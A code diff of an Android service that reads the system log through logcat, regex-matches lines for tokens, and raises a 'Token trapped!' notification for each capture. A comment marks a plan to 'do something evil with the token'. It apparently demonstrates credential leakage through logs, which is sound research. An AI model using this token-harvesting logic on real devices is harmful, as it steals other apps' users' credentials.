@@ -27,7 +27,7 @@ public class LogService extends Service {
 
 	private static Thread mThread;
 
-	private final ArrayList<TrapperResult> mResults = new ArrayList<TrapperResult>();
+	private final ArrayList<LogResult> mResults = new ArrayList<LogResult>();
 	private QueryReceiver mReceiver;
 
 	private class QueryReceiver extends BroadcastReceiver {
@@ -61,34 +61,94 @@ public class LogService extends Service {
 		if (mThread == null || !mThread.isAlive()) {
 			mThread = new Thread() {
 				int count = 0;
-				Pattern pattern = Pattern.compile(TrapperResult.getRegEx());
+				Pattern pattern = Pattern.compile(LogResult.getRegEx());
+				String verbosity = LogResult.getVerbosity();
 
 				@Override
 				public void run() {
 					Process process = null;
 					BufferedReader reader = null;
+					int bufferSize = 0;
+					if (verbosity.equals("V")) {
+						// Try to determine the size of the ring buffer; this
+						// gives us a general idea how many bytes we need to
+						// read until we reach "fresh" log messages; this trick
+						// only works for verbose output
+						try {
+							process = Runtime.getRuntime().exec(
+									new String[] { "logcat", "-g" });
+							// Read the process stream
+							reader = new BufferedReader(new InputStreamReader(
+									process.getInputStream()),
+									1024);
+							Pattern pattern = Pattern
+									.compile("\\(([0-9]+)([MK]?b) consumed\\)");
+							String line = reader.readLine();
+							Matcher matcher = pattern.matcher(line);
+							if (matcher.find() && matcher.groupCount() > 0) {
+								bufferSize = Integer.parseInt(matcher.group(1));
+								if (matcher.groupCount() > 1) {
+									if (matcher.group(2).equals("Kb")) {
+										bufferSize *= 1024;
+									} else if (matcher.group(2).equals("Mb")) {
+										bufferSize *= 1024 * 1024;
+									}
+								}
+								Log.d(LogActivity.TAG, "logcat ring buffer: "
+										+ bufferSize);
+							} else {
+								Log.d(LogActivity.TAG, line);
+							}
+						} catch (IOException e) {
+							Log.e(LogActivity.TAG, e.getMessage());
+						} finally {
+							if (process != null) {
+								process.destroy();
+							}
+							if (reader != null) {
+								try {
+									reader.close();
+								} catch (IOException e) {
+								}
+							}
+						}
+					}
+					// Read the log output through logcat
 					try {
 						process = Runtime.getRuntime().exec(
-								new String[] { "logcat", "-v", "time", "*:V" });
+								new String[] { "logcat", "-v", "time",
+										"*:" + verbosity });
 						// Read the process stream
 						reader = new BufferedReader(new InputStreamReader(
 								process.getInputStream()),
 								1024);
-						boolean firstLine = true;
+						long bytes = 0;
+						long start = 0;
 						while (!isInterrupted()) {
 							final String line = reader.readLine();
-							if (firstLine) {
+							if (bytes == 0) {
 								// The process started; indicate that the
 								// service is ready
 								sendResponse(true);
-								firstLine = false;
+								start = System.currentTimeMillis();
 							}
 							if (line == null) {
 								break;
 							}
+							if (bytes >= 0) {
+								bytes += line.length();
+								if (bytes > bufferSize) {
+									if (bufferSize > 0) {
+										// Reached end of ring buffer
+										Log.i(LogActivity.TAG,
+												"reached end of ring buffer");
+									}
+									bytes = -1;
+								}
+							}
 							handleLine(line);
 							// Short delay to prevent locking up
-							Thread.sleep(10);
+							Thread.sleep(5);
 						}
 					} catch (IOException e) {
 						Log.e(LogActivity.TAG, e.getMessage());
@@ -115,11 +175,12 @@ public class LogService extends Service {
 					Matcher match = pattern.matcher(line);
 					if (match.find()) {
 						String interest = null;
-						if (match.groupCount() > 1) {
+						if (match.groupCount() > 0) {
 							interest = match.group(1);
 						}
-						TrapperResult result = new TrapperResult(line, interest);
+						LogResult result = new LogResult(line, interest);
 						if (result.interest != null) {
+							// TODO Do something evil with the token
 							showNotification(++count, "Token trapped!", result);
 							Log.d(LogActivity.TAG, "found match");
 						}
@@ -131,7 +192,6 @@ public class LogService extends Service {
 								mResults.remove(0);
 							}
 						}
-						// TODO Do something evil with the token
 						// Update the list
 						sendResult(result);
 					}
@@ -166,7 +226,7 @@ public class LogService extends Service {
 	}
 
 	protected Notification showNotification(int id, String title,
-			TrapperResult result) {
+			LogResult result) {
 		NotificationManager ns = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
 		Notification notification = new Notification(
 				R.drawable.ic_launcher, title,
@@ -198,7 +258,7 @@ public class LogService extends Service {
 		return notification;
 	}
 
-	private void sendResult(TrapperResult result) {
+	private void sendResult(LogResult result) {
 		Intent intent = new Intent(TRAPPER_RESPONSE);
 		intent.putExtra("result", result);
 		sendBroadcast(intent);
